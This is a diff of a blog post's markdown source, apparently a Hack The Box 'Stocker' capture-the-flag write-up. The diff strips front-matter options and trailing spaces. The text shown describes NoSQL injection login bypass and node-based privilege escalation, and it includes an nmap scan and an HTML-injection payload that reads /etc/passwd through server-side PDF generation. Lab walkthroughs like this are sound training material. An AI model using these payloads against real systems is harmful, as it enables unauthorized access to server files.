@@ -4,43 +4,13 @@ description: "https://www.hackthebox.com/machines/Stocker"
 summary: "Hack The Box Machine Stocker"
 date: 2023-09-27
 draft: false
-author: "Aftab Sama" # ["Me", "You"] # multiple authors
 tags: ["Linux", "HackTheBox", "Easy", "CTF"]
-canonicalURL: ""
-showToc: true
-TocOpen: false
-TocSide: 'right'  # or 'left'
-# weight: 1
-# aliases: ["/first"]
-hidemeta: false
-comments: true
-disableHLJS: true # to disable highlightjs
-disableShare: true
-hideSummary: false
-searchHidden: false
-ShowReadingTime: true
-ShowBreadCrumbs: true
-ShowPostNavLinks: true
-ShowWordCount: true
-ShowRssButtonInSectionTermList: true
-# UseHugoToc: true
-cover:
-    image: "images/cover.webp" # image path/url
-    alt: "Stocker Machine Logo" # alt text
-    caption: "" # display caption under cover
-    relative: true # when using page bundles set this to true
-    hidden: false # only hide on current single page
-    # hiddenInSingle: false
-# editPost:
-    # URL: "https://github.com/"
-    # Text: "Suggest Changes" # edit text
-    # appendFilePath: true # to append file path to Edit link
 ---
 
 ------------------------
 
 ### About Stocker
-- Stocker is a medium difficulty Linux machine that features a website running on port 80 that advertises various house furniture. 
+- Stocker is a medium difficulty Linux machine that features a website running on port 80 that advertises various house furniture.
 - Through vHost enumeration the hostname `dev.stocker.htb` is identified and upon accessing it a login page is loaded that seems to be built with `NodeJS`.
 - By sending JSON data and performing a `NoSQL` injection, the login page is bypassed and access to an e-shop is granted.
 - Enumeration of this e-shop reveals that upon submitting a purchase order, a PDF is crafted that contains details about the items purchased. This functionality is vulnerable to HTML injection and can be abused to read system files through the usage of iframes.
@@ -54,21 +24,21 @@ we atart with nmap scan:
 ```shell
 ┌──(Jack㉿Sparrow)-[~/Downloads/htb/stocker]
 └─$ sudo nmap -sS -sC -T5 10.10.11.196 -oN nmap.txt
-[sudo] password for Jack: 
+[sudo] password for Jack:
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-30 02:18 EDT
 Nmap scan report for 10.10.11.196
 Host is up (0.68s latency).
 Not shown: 938 closed tcp ports (reset), 60 filtered tcp ports (no-response)
 PORT   STATE SERVICE
 22/tcp open  ssh
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
 |   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
 |_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
 80/tcp open  http
 |_http-title: Did not follow redirect to http://stocker.htb
 
-Nmap done: 1 IP address (1 host up) scanned in 29.93 seconds                                                           
+Nmap done: 1 IP address (1 host up) scanned in 29.93 seconds
 ```
 
 ### Foothold
@@ -123,7 +93,7 @@ Since it generates PDF on the server side, let's see if we can include server fi
 
 Let's try to Read local file.
 
-Path:`api/order` 
+Path:`api/order`
 Payload:
 ```json
 {"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<object data='file:///etc/passwd'>","description":"It's a red cup.","image":"/etc/passwd","price":32,"currentStock":4,"__v":0,"amount":1}]}
@@ -161,9 +131,9 @@ chech root Permission using `sudo -l`
 
 ```shell
 angoose@stocker:~$ sudo -l
-[sudo] password for angoose: 
+[sudo] password for angoose:
 Sorry, try again.
-[sudo] password for angoose: 
+[sudo] password for angoose:
 Matching Defaults entries for angoose on stocker:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -172,7 +142,7 @@ User angoose may run the following commands on stocker:
     (ALL) /usr/bin/node /usr/local/scripts/*.js
 ```
 
-we can escalate our privilege with node 
+we can escalate our privilege with node
 
 Payload:
 ```js
